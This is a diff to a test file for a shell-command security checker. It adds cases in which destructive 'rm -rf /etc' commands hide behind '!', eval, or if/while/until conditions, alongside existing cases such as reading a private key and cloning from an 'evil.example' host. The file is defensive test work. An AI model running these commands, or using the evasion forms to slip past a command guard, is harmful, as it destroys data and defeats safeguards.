@@ -40,6 +40,8 @@ from security_guard import (
         'printf "x \\"; rm -rf /"',     # escaped quote keeps ; inside the string (not a real subcommand)
         "rm --force=no -r /etc",        # --force takes no value: option error, no delete
         "rm --=x /etc",                 # empty long-option name is an error, not -r/-f
+        "if true; then echo hi; fi",    # leading compound keywords, but no rm anywhere
+        "eval echo hi",                 # eval of a harmless command, not rm
         "echo $SPECIFIC_VAR",
     ],
 )
@@ -98,6 +100,12 @@ def test_check_command_allows_safe_commands(command):
         ("rm -rf /etc/..", "rm_rf_dangerous"),              # absolute .. walks back to /
         ("rm -rf /usr/../..", "rm_rf_dangerous"),           # stacked absolute .. still resolves to /
         ("rm -rf $HOME/..", "rm_rf_dangerous"),             # the $HOME parent
+        ("! rm -rf /etc", "rm_rf_dangerous"),               # ! negation still executes rm
+        ("eval rm -rf /etc", "rm_rf_dangerous"),            # eval runs the (unquoted) rm
+        ("if rm -rf /etc; then echo hi; fi", "rm_rf_dangerous"),  # rm is the if-condition command
+        ("while rm -rf /etc; do :; done", "rm_rf_dangerous"),     # rm is the while-condition command
+        ("until rm -rf /etc; do :; done", "rm_rf_dangerous"),     # rm is the until-condition command
+        ("if true; then ! rm -rf /etc; fi", "rm_rf_dangerous"),   # ! after a body keyword
         ("curl -k https://example.com", "disable_ssl"),
         ("echo $PRIVATE_KEY", "expose_private_key"),
         ("git clone https://evil.example/repo.git", "git_clone_warning"),
